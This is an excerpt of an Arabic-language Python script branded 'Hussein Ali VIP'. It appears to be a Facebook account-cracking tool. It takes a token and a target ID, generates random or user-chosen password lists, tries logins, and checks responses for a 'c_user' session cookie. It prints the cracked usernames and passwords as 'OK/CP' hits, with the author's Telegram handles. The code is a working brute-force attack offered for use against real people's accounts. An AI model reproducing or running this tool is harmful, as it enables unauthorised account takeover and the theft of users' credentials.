...
os.system("xdg-open https://t.me/MR_HC6")
Z = '\033[1;36m' #احمر
R = '\033[1;35m' #احمر
X = '\033[1;34m' #اصفر
F = '\033[2;33m' #اخضر
...
Z1 = '\033[1;31m' #احمر
P = '\033[2;35m' #وردي
tokenn=input(GG+'T'*1+W+'O'*1+P+'K'*1+B+'E'*1+X+'N '*1+GG+'➯'*1+B)
os.system('clear')
print('')
IDD=input(' ID' +B+ '➯'+X )
logo=("""
\033[1;37m╔Ⓗ═════════════════\033[1;33m𝐇𝐔𝐒𝐒𝐄𝐈𝐍✯𝐀𝐋𝐈\033[1;37m══════════════Ⓗ╗
\033[1;31m│\033[1;32m☞  \033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32m𝐏𝐑𝐎𝐆𝐑𝐀𝐌𝐌𝐄𝐑 𝐇𝐔𝐒𝐒𝐄𝐈𝐍 𝐀𝐋𝐈     \033[1;31m
\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[𝐇𝐔𝐒𝐒𝐄𝐈𝐍 𝐀𝐋𝐈\033[1;31m     
\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32m𝐋5𝐋𝐌𝐐𝐐/𝐕𝐈𝐏-10\033[1;31m 
\033[1;31m│\033[1;32m☞  \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m𝐕𝐈𝐏-10                     \033[1;31m         
\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32m𝐇𝐔𝐒𝐒𝐄𝐈𝐍 𝐀𝐋𝐈    \033[1;31m   
\033[1;37m╚ⒽFACEBOOK TRICKS AND HELPING ZONE{ @H0773 }\033[1;37m Ⓗ╝
\033[1;91m==========================================================
...
def ikb():
    ...
    print(47*'-')
    print(' \033[0;1m[ \033[31;1m1 \033[0;1m] 𝐕𝐈𝐏 - تشغيل الادات ')
    print(' \033[0;1m[ \033[31;1m2 \033[0;1m] 𝐕𝐈𝐏 - قناه المبرمج ')
    print(47*'-')
...
def file():
				...
				clear()
				plist = []
				print (' \n\033[0;1m[ \033[31;1m+ \033[0;1m] 𝐕𝐈𝐏 - فحص عشوائي وا ختيار باسورد  ');linex();print (' \n\033[0;1m[ \033[31;m+ \033[0;1m] 𝐕𝐈𝐏 - [1] 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 عشوائي \n[ \033[31;m+ \033[0;1m] 𝐕𝐈𝐏 - [2] 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 ختياري ');linex()
				ppp=input(' Choose: ')
				if ppp in ['1','01']:
					...
					plist.append('11223344555544332211')
					...
					try:
						linex()
						ps_limit = int(input(' \n\033[0;1m[ \033[31;1m+ \033[0;1m] 𝐕𝐈𝐏 - ادخل كم باسورد تريد  '))
					except:
						ps_limit =1
					linex()
				...
				linex()
				print(' \033[0;1m[ \033[31;1m \033[0;1m] 𝐕𝐈𝐏 - لضهار حسابات السكيور اضغط (y)  ')
				linex()
				cx=input(' Choose: ')
				...
				print('\033[1;37m')
				linex()
				print(' \033[0;1m[ \033[31;1m \033[0;1m] 𝐕𝐈𝐏 - عدد الحسابات التي تم صيده')
				print('  OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				linex()
				input(' اكتمل الفحص ')
def api(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [Hussein Ali] %s| \033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    ...
    'accept-language': 'en-US,en;q=0.9',}
                        ...
                        if "c_user" in IK:
                                ...
                                statuscp = f'''══════════[𝐇𝐒𝐒𝐄𝐈𝐍 ➱OK]══════════ 
✮ » ＵＳＥＲ ⦁ ⦂ ⦕ @{ids} ⦖ 
                                 
✮ » Ｐ Ａ Ｓ ⦁ ⦂ ⦕ @{pas} ⦖ 
                                ══════════[𝐇𝐒𝐒𝐄𝐈𝐍➱OK]══════════ 
                                ✓ TeleGram : @H0773 : @MR_HC6 ✓					
					'''
                                print('\r\r\x1b[1;92m \n═══════[𝐇𝐔𝐒𝐒𝐄𝐈𝐍 𝐀𝐋𝐈 ➱OK]══════════\n 𝐔 𝐒 𝐄 𝐑 :  %s ﴿\n | 𝐏 𝐀 𝐒 𝐒 %s : ﴿\n•  ✮ » @MR_HC6  - @H0773 ﴿\n══════[𝐇𝐔𝐒𝐒𝐄𝐈𝐍 𝐀𝐋𝐈 ➱OK]══════════'%(ids,pas))
